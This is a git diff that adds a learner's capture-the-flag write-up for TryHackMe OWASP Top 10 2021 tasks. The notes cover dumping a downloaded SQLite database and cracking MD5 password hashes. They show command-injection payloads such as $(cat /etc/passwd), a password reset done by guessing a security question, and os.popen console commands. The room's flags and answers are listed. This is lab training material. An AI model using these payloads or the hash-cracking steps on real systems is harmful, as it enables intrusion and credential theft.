@@ -58,20 +58,168 @@ exploited without advanced networking knowledge. Indeed, in some cases, the sens
 server itself.
 
 6.Cryptographic Failures (Supporting Material 1)
+
+Here we assume we already got into a system and found a database that we can look into and we downloaded to oru system.
+To access it, we use sqlite3 <database-name>
+From here, we can see the tables in the database by using the .tables command
+
+At this point, we can dump all the data from the table, but we won't necessarily know what each column means unless we look at 
+the table information. 
+First, let's use PRAGMA table_info(customers); to see the table information. 
+Then we'll use SELECT * FROM customers; to dump the information from the table
+
+We can see from the table information that there are four columns: custID, custName, creditCard and password. 
+You may notice that this matches up with the results.
+
+0|Joy Paulson|4916 9012 2231 7905|5f4dcc3b5aa765d61d8327deb882cf99
+
+We have the custID (0), the custName (Joy Paulson), the creditCard (4916 9012 2231 7905) and a password hash 
+(5f4dcc3b5aa765d61d8327deb882cf99).
+
 7.Cryptographic Failures (Supporting Material 2)
+
+We can use https://crackstation.net/  to crack the hash or we can use john.
+
+The result is password.
+
 8.Cryptographic Failures (Challenge)
+
+We use the steps of the previous rooms we learned.
+We have the info that there is a website on the machine_ip:81
+
+I looked up the website and first did not find the hidden directory,then i decided to use dirbuster with the directory-list-1.0.txt
+and i did find /assets then i looked the hint and realized i watched the source code of the website but not of the login page.
+Then i looked up what i could find under http://x.x.x.x:81/assets we have a webapp.db that we can download and then we can access
+it with sqlite3 and the steps before mentioned.
+
+First i used sqlite3 webapp.db,then i used .tables
+
+with PRAGMA table_info(users); i got the info what the values mean like:
+
+0|userID|TEXT|1||1
+1|username|TEXT|1||0
+2|password|TEXT|1||0
+3|admin|INT|1||0
+
+with SELECT * FROM users; i got the following
+4413096d9c933359b898b6202288a650|admin|6eea9b7ef19179a06954edd0f6c05ceb|1
+23023b67a32488588db1e28579ced7ec|Bob|ad0234829205b9033196ba818f7a872b|1
+4e8423b514eef575394ff78caed3254d|Alice|268b38ca7b84f44fa0a6cdc86e6301e0|0
+
+6eea9b7ef19179a06954edd0f6c05ceb this is the hash of the admin password that we can put into crackstation.
+
+qwertyuiop is the cracked password.
+
+Then login with admin and qwertyuiop and you can see the flag.
+
+Answer:/assets,webapp.db,6eea9b7ef19179a06954edd0f6c05ceb,qwertyuiop,THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}
+
 9.Injection 
+
+SQL Injection: This occurs when user-controlled input is passed to SQL queries. As a result, an attacker can pass in SQL queries 
+to manipulate the outcome of such queries. This could potentially allow the attacker to access, modify and delete information in 
+a database when this input is passed into database queries. This would mean an attacker could steal sensitive information such 
+as personal details and credentials.
+
+Command Injection: This occurs when user input is passed to system commands. As a result, an attacker can execute arbitrary 
+system commands on application servers, potentially allowing them to access users' systems.
+
+The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands.
+There are different ways of doing this:
+
+Using an allow list: when input is sent to the server, this input is compared to a list of safe inputs or characters. If the 
+input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.
+Stripping input: If the input contains dangerous characters, these are removed before processing.
+
 10.Command Injection
+
+Read the text and use the $() commands to get informations
+
+Show us the current directory.
+$(ls)
+
+We can list the users.
+$(cat /etc/passwd)
+With this command we see also the users shell stat.
+
+We see as which user we are logged in.
+$(whoami)
+
+We can check the linux alpine version.
+$(cat /etc/alpine-release)
+
+Had to look up the /sbin/nologin because i didnt understand at first user shell stat meant.
+When they would write start directory/home directory i probably would get it easier(i hope im correct else make a pull to correct
+me)
+
+my source:
+https://medium.com/@corybantic/tryhackme-owasp-top-10-2021-writeup-159ccfadb4d7
+
+Answer:drpepper.txt,0,apache,/sbin/nologin,3.16.0
+
 11.Insecure Design
+
+I clicked forgot my password and then choose the question with the colors since they are way easier to guess.
+
+green is the answer and our password got reset to FwXNtTPyM3Q6G2 (dont know if it changes when i would reset again)
+Then i logged in and looked through the files.Funny cat pictures.
+
+Answer:THM{Not_3ven_c4tz_c0uld_sav3_U!}
+
 12.Security Misconfiguration
+
+Kinda weird this one but yeah we used the console with the following command.
+import os; print(os.popen("ls -l").read())
+
+I guess we imported the ls -l command and then it displays us the directory.
+
+Use the following command and read through the python file.
+import os; print(os.popen("cat app.py").read())
+
+
+Answers:todo.db,THM{Just_a_tiny_misconfiguration}
+
 13.Vulnerable and Outdated Components
+
+
+
 14.Vulnerable and Outdated Components - Exploit
+
+
+
 15.Vulnerable and Outdated Components - Lab
+
+
+
 16.Identification and Authentication Failures
+
+
+
 17.Identification and Authentication Failures Practical
+
+
+
 18.Software and Data Integrity Failures
+
+
+
 19.Software Integrity Failures
+
+
+
 20.Data Integrity Failures
+
+
+
 21.Security Logging and Monitoring Failures
+
+
+
 22.Server-Side Request Forgery (SSRF)
+
+
+
 23.Whats Next?
+
+
+
